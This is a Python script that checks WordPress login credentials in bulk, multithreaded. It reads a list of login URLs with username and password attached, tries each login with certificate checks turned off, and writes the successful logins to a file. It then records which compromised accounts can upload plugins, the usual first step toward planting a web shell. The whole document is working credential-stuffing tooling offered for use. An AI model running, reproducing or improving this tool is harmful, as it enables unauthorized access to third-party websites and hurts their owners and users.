import concurrent.futures
import logging
import os
import re
import requests
from colorama import Fore, init
from urllib.parse import urlparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW


def parse_url(url):
    parsed_url = urlparse(url)
    if all([parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.fragment]):
        return parsed_url
    else:
        return None


def check_login(url):
    parsed_url = parse_url(url)
    if not parsed_url:
        logger.error(fr + f"[!] Invalid URL: {url}")
        return
    try:
        site = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        user_passwd = parsed_url.fragment
        user, passwd = user_passwd.rsplit('@', 1)
        with requests.Session() as session:
            session.verify = False  # Disable SSL certificate verification
            get = session.get(site, timeout=30)
            content_str = get.content.decode('utf-8')
            submit = re.search(
                r'<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*)" />',
                content_str,
            )
            redirect = re.search(r'<input type="hidden" name="redirect_to" value="(.*?)" />', content_str)
            if submit and redirect:
                submit = submit.group(1)
                redirect = redirect.group(1)
                login_data = {
                    'log': user,
                    'pwd': passwd,
                    'wp-submit': submit,
                    'redirect_to': redirect,
                    'testcookie': '1',
                }
                req = session.post(site, data=login_data, timeout=20)
                currurl = site.replace("/wp-login.php", "")
                if 'dashboard' in req.content.decode('utf-8'):
                    logger.info(fg + f"[+] {currurl} >> Login Success! Checking install plugin...")
                    with open('loginsuccess.txt', 'a') as writer:
                        writer.write(f"{site}/wp-login.php#{user_passwd}\n")
                    ngecek = f"{currurl}/wp-admin/plugin-install.php?tab=up"
                    getdata = session.get(ngecek, timeout=20, allow_redirects=False)
                    if 'Add' in getdata.content.decode('utf-8') and getdata.status_code == 200:
                        logger.info(fg + f"[+] {currurl} >> install new plugin")
                        with open('install_new.txt', 'a') as writer:
                            writer.write(f"{site}/wp-login.php#{user_passwd}\n")
                    else:
                        logger.info(fy + f"[-] {currurl} >> No install new plugin")
                else:
                    logger.info(fy + f"[-] {currurl} >> Login failed")
            else:
                logger.error(fr + f"[!] Could not find login form submit button or redirect field on URL: {url}")
    except Exception as e:
        logger.error(fr + f"[!] An error occurred for URL: {url}\nError: {str(e)}")


if __name__ == "__main__":
    lists = input('Enter the path to your login file: ')
    if not os.path.isfile(lists):
        logger.error(fr + "[!] The specified file does not exist.")
        exit(1)
    # Disable SSL certificate warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    with open(lists) as f:
        urls = [line.strip() for line in f]
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(check_login, urls)